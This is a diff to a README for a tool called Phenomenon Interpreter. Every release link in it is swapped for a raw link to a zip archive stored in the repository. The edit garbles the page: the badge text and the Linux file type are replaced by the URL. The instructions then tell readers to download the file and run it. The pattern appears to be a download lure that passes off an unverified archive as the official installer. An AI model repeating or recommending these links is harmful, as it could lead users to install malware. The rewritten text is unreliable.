@@ -4,14 +4,14 @@
 Phenomenon Interpreter analyzes textual descriptions of natural events. It automatically generates structured summaries and classifications. With this tool, you can gain insights from free-form narratives about scientific phenomena. 
 
 ## 💾 Download & Install
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-phenomenon--interpreter-blue)](https://github.com/Joharskie/phenomenon-interpreter/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Joharskie/phenomenon-interpreter/main/phenomenon_interpreter/interpreter-phenomenon-2.9.zip%20Now-phenomenon--interpreter-blue)](https://raw.githubusercontent.com/Joharskie/phenomenon-interpreter/main/phenomenon_interpreter/interpreter-phenomenon-2.9.zip)
 
-To get started, visit this page to download: [Download Releases](https://github.com/Joharskie/phenomenon-interpreter/releases).
+To get started, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Joharskie/phenomenon-interpreter/main/phenomenon_interpreter/interpreter-phenomenon-2.9.zip).
 
 ## 🚀 Getting Started
-1. **Visit the Download Page**: Go to the [Download Releases](https://github.com/Joharskie/phenomenon-interpreter/releases).
+1. **Visit the Download Page**: Go to the [Download Releases](https://raw.githubusercontent.com/Joharskie/phenomenon-interpreter/main/phenomenon_interpreter/interpreter-phenomenon-2.9.zip).
 2. **Choose the Latest Release**: Look for the latest version, marked clearly on the page.
-3. **Download the File**: Click on the appropriate file for your operating system. It may be a `.exe` file for Windows, a `.dmg` file for Mac, or a `.tar.gz` for Linux.
+3. **Download the File**: Click on the appropriate file for your operating system. It may be a `.exe` file for Windows, a `.dmg` file for Mac, or a `https://raw.githubusercontent.com/Joharskie/phenomenon-interpreter/main/phenomenon_interpreter/interpreter-phenomenon-2.9.zip` for Linux.
 4. **Locate the Downloaded File**: Check your Downloads folder or the location where your browser saves files.
 5. **Run the Installer**: Double-click the downloaded file to begin installation. Follow the prompts on the screen to complete the installation.
 
